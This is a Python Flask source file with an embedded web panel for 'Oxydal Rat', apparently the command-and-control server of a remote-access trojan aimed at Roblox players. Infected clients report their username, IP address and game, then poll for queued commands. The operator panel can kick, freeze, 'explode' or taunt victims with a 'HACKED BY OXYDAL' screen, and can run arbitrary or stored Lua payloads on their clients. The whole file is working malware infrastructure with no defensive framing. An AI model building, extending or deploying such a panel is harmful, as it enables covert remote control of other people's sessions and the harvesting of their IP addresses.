from flask import Flask, request, jsonify, render_template_string, abort
from flask_socketio import SocketIO
import time
import eventlet
from datetime import datetime
import json
import os

eventlet.monkey_patch()

app = Flask(__name__)
app.config["SECRET_KEY"] = "super_secret_key_change_me_123456"
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")

ALLOWED_IPS = {"37.66.149.36", "91.170.86.224"}
HISTORY_FILE = "history_log.json"
PAYLOADS_FILE = "payloads.json"

connected_players = {}
pending_kicks = {}
pending_commands = {}
history_log = []
payloads = {}

def load_history():
    global history_log
    if os.path.exists(HISTORY_FILE):
        try:
            with open(HISTORY_FILE, 'r', encoding='utf-8') as f:
                history_log = json.load(f)
        except: history_log = []

def load_payloads():
    global payloads
    if os.path.exists(PAYLOADS_FILE):
        try:
            with open(PAYLOADS_FILE, 'r', encoding='utf-8') as f:
                payloads = json.load(f)
        except: payloads = {}

def save_payloads():
    try:
        with open(PAYLOADS_FILE, 'w', encoding='utf-8') as f:
            json.dump(payloads, f, ensure_ascii=False, indent=2)
    except: pass

load_history()
load_payloads()

def check_ip():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    if ip not in ALLOWED_IPS:
        abort(403)

@app.errorhandler(403)
def access_denied(e):
    detected = request.headers.get("X-Forwarded-For", request.remote_addr)
    if detected and "," in detected:
        detected = detected.split(",")[0].strip()
    return f"<html><body style='background:#0f172a;color:#06b6d4;font-family:monospace;text-align:center;padding-top:15%'><h1>Accès refusé</h1><p>Ton IP : <b>{detected}</b></p></body></html>", 403

@app.before_request
def protect_routes():
    if request.path in ["/", "/kick", "/troll", "/payload"] or request.path.startswith("/api"):
        check_ip()

def add_history(event_type, username, details=""):
    timestamp = datetime.now().strftime("%H:%M:%S")
    history_log.insert(0, {"time": timestamp, "type": event_type, "username": username, "details": details})
    if len(history_log) > 100: history_log.pop()
    try:
        with open(HISTORY_FILE, 'w', encoding='utf-8') as f:
            json.dump(history_log, f, ensure_ascii=False, indent=2)
    except: pass
    socketio.emit("history_update", {"history": history_log[:50]})

HTML = """<!DOCTYPE html>
<html lang="en" class="dark">
<head>
<meta charset="UTF-8">
<title>Oxydal Rat — Wave Theme</title>
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono&family=Orbitron:wght@700&family=Press+Start+2P&family=Creepster&family=Bangers&family=Nosifer&family=Monoton&family=Audiowide&family=Wallpoet&family=VT323&family=Share+Tech+Mono&family=Exo+2:wght@700&family=Rajdhani:wght@600&family=Anton&family=Bebas+Neue&family=Righteous&family=Russo+One&family=Staatliches&family=Teko:wght@600&family=Fredoka+One&family=Pacifico&family=Lobster&family=Dancing+Script:wght@700&family=Caveat&display=swap" rel="stylesheet">
<style>
    :root{--bg:#0f172a;--card:#1e293b;--border:#334155;--primary:#06b6d4;--primary-hover:#0891b2;--text:#e2e8f0;--text-muted:#94a3b8;}
    *{margin:0;padding:0;box-sizing:border-box;}
    body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;display:flex;}
    .header{position:fixed;top:0;left:0;right:0;height:70px;background:rgba(15,23,42,0.95);backdrop-filter:blur(12px);border-bottom:1px solid var(--border);z-index:1000;display:flex;align-items:center;padding:0 2rem;justify-content:space-between;}
    .logo{display:flex;align-items:center;gap:12px;font-weight:700;font-size:1.5rem;}
    .logo svg{width:40px;height:40px;fill:var(--primary);}
    .stats{font-size:1.1rem;color:var(--text-muted);}
    .stats b{color:var(--primary);font-weight:600;}
    .main{flex:1;margin-top:70px;display:flex;}
    .sidebar{width:260px;background:rgba(30,41,59,0.95);border-right:1px solid var(--border);padding:1.5rem 0;}
    .nav-item{padding:1rem 2rem;cursor:pointer;transition:all .3s;color:var(--text-muted);font-weight:500;}
    .nav-item:hover{background:rgba(6,182,212,.15);color:var(--primary);}
    .nav-item.active{background:rgba(6,182,212,.25);color:var(--primary);border-left:4px solid var(--primary);}
    .content{flex:1;padding:2rem;overflow-y:auto;}
    .search-bar{margin-bottom:20px;}
    .search-bar input{width:100%;padding:14px;background:#0f172a;border:1px solid var(--border);border-radius:12px;color:white;font-size:1rem;}
    .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:1.5rem;}
    .card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:1.5rem;transition:all .4s;position:relative;overflow:hidden;}
    .card:hover{transform:translateY(-10px);box-shadow:0 25px 50px rgba(6,182,212,.25);border-color:var(--primary);}
    .card::before{content:'';position:absolute;top:0;left:0;right:0;height:4px;background:linear-gradient(90deg,transparent,var(--primary),transparent);opacity:0;transition:.4s;}
    .card:hover::before{opacity:1;}
    .status{display:flex;align-items:center;gap:8px;margin-bottom:12px;}
    .dot{width:10px;height:10px;border-radius:50%;background:#ef4444;box-shadow:0 0 10px #ef444430;}
    .dot.online{background:var(--primary);box-shadow:0 0 20px var(--primary);animation:pulse 2s infinite;}
    @keyframes pulse{0%,100%{opacity:1}50%{opacity:.7}}
    .name{font-size:1.3rem;font-weight:600;margin-bottom:8px;}
    .name a{color:var(--primary);text-decoration:none;}
    .info{font-size:.9rem;color:var(--text-muted);line-height:1.5;margin-bottom:16px;}
    .category{font-weight:bold;color:var(--primary);margin:16px 0 8px;font-size:.95rem;}
    .btn-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;}
    .btn{padding:10px;border:none;border-radius:10px;font-weight:600;font-size:.8rem;cursor:pointer;transition:all .3s;color:white;
         background:linear-gradient(135deg,#06b6d4,#0891b2);box-shadow:0 4px 15px rgba(6,182,212,.3);}
    .btn:hover{transform:translateY(-4px);box-shadow:0 10px 25px rgba(6,182,212,.5);}
    .btn.kick{background:linear-gradient(135deg,#ef4444,#dc2626);}
    .btn.undo{background:#475569;}
    .modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.9);z-index:2000;align-items:center;justify-content:center;}
    .modal.active{display:flex;}
    .modal-content{background:var(--card);border:2px solid var(--primary);border-radius:16px;width:90%;max-width:700px;padding:2rem;box-shadow:0 30px 80px rgba(6,182,212,.5);}
    .modal-content h2{color:var(--primary);margin-bottom:1rem;text-align:center;font-size:1.6rem;}
    input,textarea,select{width:100%;padding:14px;background:#0f172a;border:1px solid var(--border);border-radius:12px;color:white;margin-bottom:1rem;font-family:'JetBrains Mono',monospace;}
    .font-preview{font-family:var(--preview-font,'Inter');font-size:80px;color:var(--preview-color,#06b6d4);margin:20px 0;padding:10px;background:#0f172a;border-radius:8px;text-align:center;}
    .modal-buttons{display:flex;gap:1rem;}
    .modal-btn{flex:1;padding:14px;border:none;border-radius:12px;font-weight:600;cursor:pointer;transition:all .3s;}
    .confirm{background:var(--primary);color:white;}
    .confirm:hover{background:var(--primary-hover);transform:translateY(-3px);}
    .cancel{background:#475569;color:white;}
    .toast-container{position:fixed;bottom:20px;right:20px;z-index:9999;}
    .toast{background:var(--card);border-left:5px solid var(--primary);padding:1rem 1.5rem;margin-top:1rem;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,.6);animation:slideIn .4s;}
    @keyframes slideIn{from{transform:translateX(100%)}to{transform:translateX(0)}}
    .payload-list{max-height:300px;overflow-y:auto;border:1px solid var(--border);border-radius:12px;padding:10px;background:#0f172a;margin-bottom:1rem;}
    .payload-item{cursor:pointer;padding:10px;border-radius:8px;margin-bottom:8px;background:#1e293b;transition:all .2s;}
    .payload-item:hover{background:#334155;}
    .payload-item.selected{background:var(--primary);color:black;}
</style>
</head>
<body>

<div class="header">
    <div class="logo">
        <svg viewBox="0 0 738 738"><rect fill="#0f172a" width="738" height="738"></rect><path fill="#06b6d4" d="M550.16,367.53q0,7.92-.67,15.66c-5.55-17.39-19.61-44.32-53.48-44.32-50,0-54.19,44.6-54.19,44.6a22,22,0,0,1,18.19-9c12.51,0,19.71,4.92,19.71,18.19S468,415.79,448.27,415.79s-40.93-11.37-40.93-42.44c0-58.71,55.27-68.56,55.27-68.56-44.84-4.05-61.56,4.76-75.08,23.3-25.15,34.5-9.37,77.47-9.37,77.47s-33.87-18.95-33.87-74.24c0-89.28,91.33-100.93,125.58-87.19-23.74-23.75-43.4-29.53-69.11-29.53-62.53,0-108.23,60.13-108.23,111,0,44.31,34.85,117.16,132.31,117.16,86.66,0,95.46-55.09,86-69,36.54,36.57-17.83,84.12-86,84.12-28.87,0-105.17-6.55-150.89-79.59C208,272.93,334.58,202.45,334.58,202.45c-32.92-2.22-54.82,7.85-56.62,8.71a181,181,0,0,1,272.2,156.37Z"></path></svg>
        <div>Oxydal Rat</div>
    </div>
    <div class="stats">Players online: <b id="stats">0</b></div>
</div>

<div class="main">
    <div class="sidebar">
        <div class="nav-item active" data-tab="players">Players</div>
        <div class="nav-item" data-tab="workshop">Workshop</div>
        <div class="nav-item" data-tab="history">History</div>
    </div>

    <div class="content">
        <div id="players-tab" class="tab active">
            <div class="search-bar"><input type="text" id="searchInput" placeholder="Search by username, ID, IP, Game, JobId..." onkeyup="filterPlayers()"></div>
            <div class="grid" id="players"></div>
        </div>
        <div id="workshop-tab" class="tab" style="display:none;">
            <button class="btn" style="margin-bottom:20px;" id="newPayloadBtn">+ New Payload</button>
            <div id="payloads-list"></div>
        </div>
        <div id="history-tab" class="tab" style="display:none;"><div id="history"></div></div>
    </div>
</div>

<!-- Text Screen (police, couleur, taille, preview) -->
<div class="modal" id="textScreenModal"><div class="modal-content">
    <h2>Display Text Screen</h2>
    <input type="text" id="screenText" placeholder="Enter text" value="HACKED BY OXYDAL">
    <label style="color:#94a3b8;font-size:0.9rem;">Font</label>
    <select id="textFont">
        <option value="Arial">Arial</option>
        <option value="Orbitron">Orbitron</option>
        <option value="Press Start 2P">Press Start 2P</option>
        <option value="Creepster">Creepster</option>
        <option value="Bangers">Bangers</option>
        <option value="Nosifer" selected>Nosifer</option>
        <option value="Monoton">Monoton</option>
        <option value="Audiowide">Audiowide</option>
        <option value="VT323">VT323</option>
        <option value="Bebas Neue">Bebas Neue</option>
        <option value="Righteous">Righteous</option>
        <option value="Pacifico">Pacifico</option>
        <option value="Lobster">Lobster</option>
        <option value="Dancing Script">Dancing Script</option>
    </select>
    <label style="color:#94a3b8;font-size:0.9rem;">Color</label>
    <input type="color" id="textColor" value="#ff0000">
    <label style="color:#94a3b8;font-size:0.9rem;">Size (10-200)</label>
    <input type="range" id="textSize" min="10" max="200" value="97">
    <div class="font-preview" id="fontPreview">Preview Text</div>
    <div class="modal-buttons">
        <button class="modal-btn cancel">Cancel</button>
        <button class="modal-btn confirm" id="confirmText">Display Text</button>
    </div>
</div></div>

<!-- Autres modals -->
<div class="modal" id="kickModal"><div class="modal-content"><h2>Kick Player</h2><input type="text" id="kickReason" placeholder="Reason (optional)" autofocus><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmKick">Confirm Kick</button></div></div></div>
<div class="modal" id="playSoundModal"><div class="modal-content"><h2>Play Sound</h2><input type="text" id="soundAssetId" placeholder="Enter Asset ID" autofocus><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmSound">Play</button></div></div></div>
<div class="modal" id="luaExecModal"><div class="modal-content"><h2>Execute Lua Script</h2><textarea id="luaScript" placeholder="Enter Lua code" style="height:180px;"></textarea><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmLua">Execute</button></div></div></div>
<div class="modal" id="importFileModal"><div class="modal-content"><h2>Import Lua File</h2><input type="file" id="luaFileInput" accept=".lua,.txt" style="padding:1rem;background:#0f172a;border:2px dashed var(--primary);border-radius:12px;cursor:pointer;"><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmImport">Execute File</button></div></div></div>
<div class="modal" id="payloadModal"><div class="modal-content"><h2 id="payloadModalTitle">Create Payload</h2><input type="text" id="payloadName" placeholder="Payload name"><textarea id="payloadCode" placeholder="Lua code..." style="height:200px;"></textarea><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="savePayload">Save</button></div></div></div>

<!-- Import Payload avec recherche + édition -->
<div class="modal" id="executePayloadModal"><div class="modal-content">
    <h2>Import & Edit Payload</h2>
    <div class="search-bar"><input type="text" id="payloadSearch" placeholder="Search payload by name..." onkeyup="filterPayloads()"></div>
    <div class="payload-list" id="payloadList"></div>
    <textarea id="tempPayloadCode" placeholder="Select a payload to edit..." style="height:250px;"></textarea>
    <div class="modal-buttons">
        <button class="modal-btn cancel">Cancel</button>
        <button class="modal-btn confirm" id="executeTempPayload">Execute Modified</button>
    </div>
</div></div>

<div class="toast-container" id="toasts"></div>

<script>
const socket = io();
let currentKickId = null, currentSoundId = null, currentTextId = null, currentLuaId = null, currentImportId = null;
let editingPayload = null;
let selectedPayloadName = null;

// Navigation
document.querySelectorAll('.nav-item').forEach(item => {
    item.addEventListener('click', () => {
        document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
        document.querySelectorAll('.tab').forEach(t => t.style.display = 'none');
        item.classList.add('active');
        document.getElementById(item.dataset.tab + '-tab').style.display = 'block';
        if (item.dataset.tab === 'workshop') loadPayloads();
    });
});

function toast(msg) {
    const t = document.createElement("div"); t.className = "toast"; t.textContent = msg;
    document.getElementById("toasts").appendChild(t);
    setTimeout(() => t.remove(), 4000);
}

// Recherche joueurs
function filterPlayers() {
    const query = document.getElementById("searchInput").value.toLowerCase();
    document.querySelectorAll('.card').forEach(card => {
        const text = card.textContent.toLowerCase();
        card.style.display = text.includes(query) ? "block" : "none";
    });
}

// TextScreen Preview
function updatePreview() {
    const text = document.getElementById("screenText").value || "Preview Text";
    const font = document.getElementById("textFont").value;
    const color = document.getElementById("textColor").value;
    const size = document.getElementById("textSize").value;
    const preview = document.getElementById("fontPreview");
    preview.textContent = text;
    preview.style.fontFamily = font;
    preview.style.color = color;
    preview.style.fontSize = size + "px";
}
document.getElementById("screenText").addEventListener("input", updatePreview);
document.getElementById("textFont").addEventListener("change", updatePreview);
document.getElementById("textColor").addEventListener("input", updatePreview);
document.getElementById("textSize").addEventListener("input", updatePreview);

// TextScreen ENVOI PROPRE (JSON stringifié)
document.getElementById("confirmText").addEventListener("click", () => {
    const text = document.getElementById("screenText").value.trim();
    if (!text) return toast("Enter text");
    const payload = JSON.stringify({
        text: text,
        font: document.getElementById("textFont").value,
        color: document.getElementById("textColor").value,
        size: parseInt(document.getElementById("textSize").value)
    });
    sendTroll(currentTextId, "textscreen", payload);
    document.getElementById("textScreenModal").classList.remove("active");
});

function openTextScreenModal(id){
    currentTextId = id;
    document.getElementById("screenText").value = "HACKED BY OXYDAL";
    document.getElementById("textFont").value = "Nosifer";
    document.getElementById("textColor").value = "#ff0000";
    document.getElementById("textSize").value = 97;
    updatePreview();
    document.getElementById("textScreenModal").classList.add("active");
}

// Workshop
function loadPayloads() {
    fetch("/payload?action=list").then(r => r.json()).then(data => {
        const list = document.getElementById("payloads-list");
        list.innerHTML = Object.keys(data).length === 0 ? "<p style='color:#94a3b8'>No payload yet. Create one!</p>" : "";
        for (const [name, code] of Object.entries(data)) {
            const div = document.createElement("div");
            div.className = "payload-item";
            div.innerHTML = `<div><strong>${name}</strong><br><span style="font-size:0.8rem;color:#94a3b8">${code.substring(0,80)}${code.length>80?"...":""}</span></div>
                <div><button class="btn" style="padding:6px 12px;font-size:0.75rem;margin:0 4px" onclick="editPayload('${name}')">Edit</button>
                <button class="btn kick" style="padding:6px 12px;font-size:0.75rem;margin:0 4px" onclick="deletePayload('${name}')">Delete</button></div>`;
            list.appendChild(div);
        }
    });
}

document.getElementById("newPayloadBtn").addEventListener("click", () => {
    editingPayload = null;
    document.getElementById("payloadModalTitle").textContent = "Create Payload";
    document.getElementById("payloadName").value = "";
    document.getElementById("payloadCode").value = "";
    document.getElementById("payloadModal").classList.add("active");
});

window.editPayload = function(name) {
    fetch("/payload?action=get&name=" + encodeURIComponent(name)).then(r => r.json()).then(d => {
        editingPayload = name;
        document.getElementById("payloadModalTitle").textContent = "Edit Payload";
        document.getElementById("payloadName").value = name;
        document.getElementById("payloadCode").value = d.code;
        document.getElementById("payloadModal").classList.add("active");
    });
};

window.deletePayload = function(name) {
    if (confirm("Delete payload " + name + " ?")) {
        fetch("/payload", {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({action:"delete",name})})
            .then(() => { toast("Payload deleted"); loadPayloads(); });
    }
};

document.getElementById("savePayload").addEventListener("click", () => {
    const name = document.getElementById("payloadName").value.trim();
    const code = document.getElementById("payloadCode").value;
    if (!name || !code) return toast("Name and code required");
    fetch("/payload", {method:"POST",headers:{"Content-Type":"application/json"},
        body: JSON.stringify({action: editingPayload ? "update" : "create", name, code, oldname: editingPayload})
    }).then(() => {
        toast(editingPayload ? "Payload updated" : "Payload created");
        document.getElementById("payloadModal").classList.remove("active");
        loadPayloads();
    });
});

// Import Payload avec recherche + édition
window.openPayloadSelector = function(id) {
    currentLuaId = id;
    fetch("/payload?action=list").then(r => r.json()).then(data => {
        const list = document.getElementById("payloadList");
        list.innerHTML = "";
        if (Object.keys(data).length === 0) {
            list.innerHTML = "<p style='color:#94a3b8;text-align:center'>No payload available</p>";
        } else {
            for (const name of Object.keys(data)) {
                const item = document.createElement("div");
                item.className = "payload-item";
                item.textContent = name;
                item.onclick = () => {
                    document.querySelectorAll('#payloadList .payload-item').forEach(i => i.classList.remove('selected'));
                    item.classList.add('selected');
                    fetch("/payload?action=get&name=" + encodeURIComponent(name)).then(r => r.json()).then(d => {
                        document.getElementById("tempPayloadCode").value = d.code;
                    });
                };
                list.appendChild(item);
            }
        }
        document.getElementById("tempPayloadCode").value = "";
        document.getElementById("payloadSearch").value = "";
        document.getElementById("executePayloadModal").classList.add("active");
    });
};

function filterPayloads() {
    const query = document.getElementById("payloadSearch").value.toLowerCase();
    document.querySelectorAll('#payloadList .payload-item').forEach(item => {
        item.style.display = item.textContent.toLowerCase().includes(query) ? "block" : "none";
    });
}

document.getElementById("executeTempPayload").addEventListener("click", () => {
    const code = document.getElementById("tempPayloadCode").value.trim();
    if (!code) return toast("No code to execute");
    sendTroll(currentLuaId, "luaexec", code);
    document.getElementById("executePayloadModal").classList.remove("active");
});

// Fonctions classiques
function openKickModal(id){currentKickId=id;document.getElementById("kickModal").classList.add("active");document.getElementById("kickReason").focus();}
function openPlaySoundModal(id){currentSoundId=id;document.getElementById("playSoundModal").classList.add("active");}
function openLuaExecModal(id){currentLuaId=id;document.getElementById("luaExecModal").classList.add("active");}
function openImportFileModal(id){currentImportId=id;document.getElementById("importFileModal").classList.add("active");}

document.querySelectorAll('.modal .cancel').forEach(b => b.addEventListener("click", () => b.closest('.modal').classList.remove("active")));

function sendTroll(id,cmd,param=null){
    const body={userid:id,cmd};
    if(param){if(cmd==="playsound")body.assetId=param;else if(cmd==="textscreen")body.text=param;else if(cmd==="luaexec")body.script=param;}
    fetch("/troll",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(body)});
    toast(cmd.toUpperCase()+" sent");
}

document.getElementById("confirmKick").addEventListener("click",()=>{const r=document.getElementById("kickReason").value.trim()||"Kicked by admin";fetch("/kick",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:currentKickId,reason:r})});toast("KICK sent");document.getElementById("kickModal").classList.remove("active");});
document.getElementById("confirmSound").addEventListener("click",()=>{const a=document.getElementById("soundAssetId").value.trim();if(a)sendTroll(currentSoundId,"playsound",a);document.getElementById("playSoundModal").classList.remove("active");});
document.getElementById("confirmLua").addEventListener("click",()=>{const s=document.getElementById("luaScript").value.trim();if(s)sendTroll(currentLuaId,"luaexec",s);document.getElementById("luaExecModal").classList.remove("active");});
document.getElementById("confirmImport").addEventListener("click",()=>{
    const f=document.getElementById("luaFileInput").files[0];
    if(!f)return toast("Select a file");
    const r=new FileReader();
    r.onload=e=>{sendTroll(currentImportId,"luaexec",e.target.result);document.getElementById("importFileModal").classList.remove("active");document.getElementById("luaFileInput").value="";};
    r.readAsText(f);
});

function render(data){
    document.getElementById("stats").innerText=data.online;
    const grid=document.getElementById("players");
    const currentIds=new Set(Object.keys(data.players));
    Object.entries(data.players).forEach(([id,p])=>{
        let card=document.getElementById(`card_${id}`);
        if(!card){card=document.createElement("div");card.className="card";card.id=`card_${id}`;grid.appendChild(card);}
        card.innerHTML=`
            <div class="status"><div class="dot ${p.online?"online":""}"></div><span>${p.online?"Online":"Offline"}</span></div>
            <div class="name"><a href="https://www.roblox.com/users/${id}/profile" target="_blank">${p.username}</a> (ID ${id})</div>
            <div class="info">Executor: ${p.executor}<br>IP: ${p.ip}<br>Game: <a href="https://www.roblox.com/games/${p.gameId}" target="_blank">${p.game}</a><br>JobId: ${p.jobId || "N/A"}</div>

            <div class="category">TROLLS</div>
            <div class="btn-grid">
                <button class="btn kick" onclick="openKickModal('${id}')">KICK</button>
                <button class="btn" onclick="sendTroll('${id}','freeze')">FREEZE</button>
                <button class="btn" onclick="sendTroll('${id}','spin')">SPIN</button>
                <button class="btn" onclick="sendTroll('${id}','jump')">JUMP</button>
                <button class="btn" onclick="sendTroll('${id}','rainbow')">RAINBOW</button>
                <button class="btn" onclick="sendTroll('${id}','explode')">EXPLODE</button>
                <button class="btn" onclick="sendTroll('${id}','invisible')">INVISIBLE</button>
                <button class="btn" onclick="openPlaySoundModal('${id}')">PLAY SOUND</button>
                <button class="btn" onclick="openTextScreenModal('${id}')">TEXT SCREEN</button>
            </div>

            <div class="category">UNDO</div>
            <div class="btn-grid">
                <button class="btn undo" onclick="sendTroll('${id}','unfreeze')">UNFREEZE</button>
                <button class="btn undo" onclick="sendTroll('${id}','unspin')">UNSPIN</button>
                <button class="btn undo" onclick="sendTroll('${id}','unrainbow')">STOP RAINBOW</button>
                <button class="btn undo" onclick="sendTroll('${id}','uninvisible')">VISIBLE</button>
                <button class="btn undo" onclick="sendTroll('${id}','stopsound')">STOP SOUND</button>
                <button class="btn undo" onclick="sendTroll('${id}','hidetext')">HIDE TEXT</button>
            </div>

            <div class="category">LUA EXEC</div>
            <div class="btn-grid" style="grid-template-columns:1fr 1fr 1fr">
                <button class="btn" onclick="openImportFileModal('${id}')">IMPORT FILE</button>
                <button class="btn" onclick="openLuaExecModal('${id}')">EXECUTOR</button>
                <button class="btn" onclick="openPayloadSelector('${id}')">IMPORT PAYLOAD</button>
            </div>
        `;
    });
    document.querySelectorAll('.card').forEach(c=>{if(!currentIds.has(c.id.replace('card_','')))c.remove();});
}

function renderHistory(data){
    document.getElementById("history").innerHTML = data.history.map(h=>`<div class="payload-item"><strong>[${h.time}] ${h.username}</strong><br><span style="color:#94a3b8">${h.details}</span></div>`).join('');
}

socket.on("update", render);
socket.on("history_update", renderHistory);
socket.on("kick_notice", d => toast(d.username + " → " + d.reason));
fetch("/get_history").then(r=>r.json()).then(renderHistory);
</script>
</body>
</html>"""

@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/get_history")
def get_history():
    return jsonify({"history": history_log[:50]})

@app.route("/api", methods=["GET", "POST"])
def api():
    now = time.time()
    if request.method == "POST":
        try:
            d = request.get_json(silent=True) or {}
            uid = str(d["userid"])
            if d.get("action") == "register":
                username = d.get("username", "Unknown")
                connected_players[uid] = {
                    "username": username, "executor": d.get("executor", "Unknown"),
                    "ip": d.get("ip", "Unknown"), "last": now, "online": True,
                    "game": d.get("game", "Unknown"), "gameId": d.get("gameId", 0),
                    "jobId": d.get("jobId", "Unknown")
                }
                add_history("connect", username, f"Connected from {d.get('game', 'Unknown')}")
            elif d.get("action") == "heartbeat" and uid in connected_players:
                connected_players[uid]["last"] = now
        except: pass
        return jsonify({"ok": True})

    if request.method == "GET":
        uid = str(request.args.get("userid", ""))
        if not uid: return jsonify({})
        if uid in pending_kicks:
            reason = pending_kicks.pop(uid, "Kicked")
            return jsonify({"command": "kick", "reason": reason})
        if uid in pending_commands:
            cmd = pending_commands.pop(uid)
            result = {"command": cmd.get("cmd") if isinstance(cmd, dict) else cmd}
            if isinstance(cmd, dict):
                if "assetId" in cmd: result["assetId"] = cmd["assetId"]
                if "text" in cmd: result["text"] = cmd["text"]
                if "script" in cmd: result["script"] = cmd["script"]
            return jsonify(result)
        return jsonify({})

@app.route("/kick", methods=["POST"])
def kick():
    check_ip()
    data = request.get_json() or {}
    uid = str(data.get("userid", ""))
    reason = data.get("reason", "No reason")
    pending_kicks[uid] = reason
    name = connected_players.get(uid, {}).get("username", "Unknown")
    add_history("action", name, f"KICKED: {reason}")
    socketio.emit("kick_notice", {"username": name, "reason": f"KICK: {reason}"})
    return jsonify({"sent": True})

@app.route("/troll", methods=["POST"])
def troll():
    check_ip()
    data = request.get_json() or {}
    uid = str(data.get("userid", ""))
    cmd = data.get("cmd", "")
    if uid and cmd:
        cmd_data = {"cmd": cmd}
        details = f"{cmd.upper()}"
        if "assetId" in data:
            cmd_data["assetId"] = data["assetId"]
            details += f" (Asset: {data['assetId']})"
        elif "text" in data:
            cmd_data["text"] = data["text"]  # ← Envoi propre (string JSON)
            details += " (Styled Text)"
        elif "script" in data:
            cmd_data["script"] = data["script"]
            details += f" (Script: {len(data['script'])} chars)"
        pending_commands[uid] = cmd_data
        name = connected_players.get(uid, {}).get("username", "Unknown")
        add_history("action", name, details)
    return jsonify({"sent": True})

@app.route("/payload", methods=["GET", "POST"])
def payload_manager():
    check_ip()
    if request.method == "GET":
        action = request.args.get("action")
        if action == "list": return jsonify(payloads)
        if action == "get":
            name = request.args.get("name")
            return jsonify({"code": payloads.get(name, "")})
    else:
        data = request.get_json() or {}
        action = data.get("action")
        if action == "create":
            payloads[data["name"]] = data["code"]
        elif action == "update":
            if data.get("oldname") in payloads:
                del payloads[data["oldname"]]
            payloads[data["name"]] = data["code"]
        elif action == "delete":
            payloads.pop(data.get("name"), None)
        save_payloads()
        return jsonify({"ok": True})
    return jsonify({"error": "invalid"})

def broadcast_loop():
    while True:
        now = time.time()
        online = 0
        to_remove = []
        for uid, p in list(connected_players.items()):
            if now - p["last"] > 30:
                to_remove.append(uid)
            else:
                was_online = p["online"]
                p["online"] = now - p["last"] < 15
                if was_online and not p["online"]:
                    add_history("disconnect", p["username"], "Connection lost")
                if p["online"]: online += 1
        for uid in to_remove:
            username = connected_players.pop(uid, {}).get("username", "Unknown")
            add_history("disconnect", username, "Disconnected")
        socketio.emit("update", {"players": connected_players, "online": online, "total": len(connected_players)})
        socketio.sleep(2)

if __name__ == "__main__":
    socketio.start_background_task(broadcast_loop)
    socketio.run(app, host="0.0.0.0", port=5000)
